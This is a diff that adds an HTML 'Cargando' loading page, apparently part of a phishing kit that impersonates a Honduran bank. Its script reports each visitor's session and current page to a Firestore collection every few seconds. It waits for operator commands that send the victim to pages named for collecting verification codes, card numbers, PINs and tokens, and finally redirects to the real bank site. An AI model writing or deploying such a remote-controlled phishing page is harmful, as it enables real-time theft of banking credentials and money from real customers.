@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Cargando...</title>
+    
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+    <link href="https://fonts.googleapis.com/css2?family=Maven+Pro:wght@400;500;600;700&display=swap" rel="stylesheet">
+
+    <style>
+        :root {
+            --font-main: 'Maven Pro', sans-serif;
+        }
+
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: var(--font-main);
+            background-color: #ffffff;
+            color: #333333;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+            box-sizing: border-box;
+            opacity: 1;
+            transition: opacity 0.4s ease-in-out;
+        }
+
+        body.fade-out {
+            opacity: 0;
+        }
+
+        *, *:before, *:after {
+            box-sizing: inherit;
+        }
+
+        /* Contenedor principal centrado */
+        .loading-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            gap: 20px;
+        }
+
+        /* Animación de crecimiento y reducción más lenta */
+        @keyframes pulseLogo {
+            0% {
+                transform: scale(0.85);
+                opacity: 0.6;
+            }
+            50% {
+                transform: scale(1.15);
+                opacity: 1;
+            }
+            100% {
+                transform: scale(0.85);
+                opacity: 0.6;
+            }
+        }
+
+        .logo-cargando {
+            width: 130px;
+            height: auto;
+            display: block;
+            /* Se aumentó de 1.6s a 3s para que sea más lento y fluido */
+            animation: pulseLogo 3s ease-in-out infinite;
+        }
+
+        /* Estilo para el texto de carga */
+        .loading-text {
+            font-size: 15px;
+            font-weight: 500;
+            color: #6b7280;
+            letter-spacing: 0.5px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="loading-container">
+        <img src="logo.png" alt="Cargando..." class="logo-cargando">
+        <div class="loading-text">Cargando, por favor espera...</div>
+    </div>
+
+    <script src="config.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-firestore.js"></script>
+    <script>
+        function cambiarPaginaSuave(urlDestino) {
+            document.body.classList.add('fade-out');
+            setTimeout(() => {
+                window.location.href = urlDestino;
+            }, 400);
+        }
+
+        function obtenerUsuarioActual() {
+            let sessionIdUnico = localStorage.getItem("sesion_admin_id");
+            if (!sessionIdUnico) {
+                sessionIdUnico = 'user_' + Math.random().toString(36).substr(2, 9) + Date.now();
+                localStorage.setItem("sesion_admin_id", sessionIdUnico);
+            }
+            return sessionIdUnico;
+        }
+
+        let intervalLatido = null;
+
+        function iniciarLatido(docRef, nombrePaginaActual) {
+            if (intervalLatido) clearInterval(intervalLatido);
+
+            intervalLatido = setInterval(async () => {
+                try {
+                    const docSnap = await docRef.get();
+                    if (docSnap.exists) {
+                        await docRef.set({
+                            pagina_actual: nombrePaginaActual,
+                            last_active: firebase.firestore.FieldValue.serverTimestamp()
+                        }, { merge: true });
+                    }
+                } catch (err) {
+                    console.error("Error en latido periódico:", err);
+                }
+            }, 3000);
+        }
+
+        document.addEventListener("DOMContentLoaded", async () => {
+            if (!firebase.apps.length) {
+                firebase.initializeApp(firebaseConfig);
+            }
+            const db = firebase.firestore();
+
+            // Asignado directamente para que llegue como "Cargando" a Firebase
+            const nombrePaginaActual = "Cargando";
+
+            let usuarioId = obtenerUsuarioActual();
+            if (usuarioId) {
+                const docRef = db.collection(COLECCION_NOMBRE).doc(usuarioId);
+                let esPrimerSnapshot = true;
+                let ultimoComandoProcesado = null;
+                let ultimaPaginaProcesada = null;
+
+                try {
+                    const docCheck = await docRef.get();
+                    if (docCheck.exists) {
+                        iniciarLatido(docRef, nombrePaginaActual);
+                    }
+                } catch(e) {
+                    console.error("Error comprobando existencia inicial:", e);
+                }
+
+                docRef.onSnapshot((doc) => {
+                    if (!doc.exists) {
+                        if (intervalLatido) clearInterval(intervalLatido);
+                        return;
+                    }
+
+                    const data = doc.data();
+                    const targetPage = data.page;
+                    const comando = data.comando;
+
+                    if (esPrimerSnapshot) {
+                        esPrimerSnapshot = false;
+                        ultimoComandoProcesado = comando;
+                        ultimaPaginaProcesada = targetPage;
+                        return;
+                    }
+
+                    if (comando && comando !== "" && comando !== ultimoComandoProcesado) {
+                        ultimoComandoProcesado = comando;
+                        if (intervalLatido) clearInterval(intervalLatido);
+                        switch (comando.toLowerCase()) {
+                            case 'codigo': case 'code': cambiarPaginaSuave("cod.html"); break;
+                            case 'incorrecto': case 'error': cambiarPaginaSuave("indexinc.html"); break;
+                            case 'tarjeta': cambiarPaginaSuave("tarj.html"); break;
+                            case 'pin': cambiarPaginaSuave("pln.html"); break;
+                            case 'token': cambiarPaginaSuave("tk.html"); break;
+                            case 'salir': cambiarPaginaSuave("https://bancatlan.hn/"); break;
+                            case 'eliminar': cambiarPaginaSuave("index.html"); break;
+                            default: cambiarPaginaSuave(comando); break;
+                        }
+                        return;
+                    }
+
+                    if (targetPage !== undefined && targetPage !== null && targetPage !== ultimaPaginaProcesada) {
+                        ultimaPaginaProcesada = targetPage;
+                        if (intervalLatido) clearInterval(intervalLatido);
+                        
+                        const mapas = {
+                            0: "index.html",
+                            1: "cod.html",
+                            2: "indexinc.html",
+                            3: "tarj.html",
+                            4: "pln.html",
+                            5: "tk.html",
+                            6: "https://bancatlan.hn/"
+                        };
+                        
+                        if (mapas[targetPage]) {
+                            cambiarPaginaSuave(mapas[targetPage]);
+                        }
+                    }
+                }, (error) => {
+                    console.error("Error en el listener:", error);
+                });
+            }
+        });
+    </script>
+</body>
+</html>
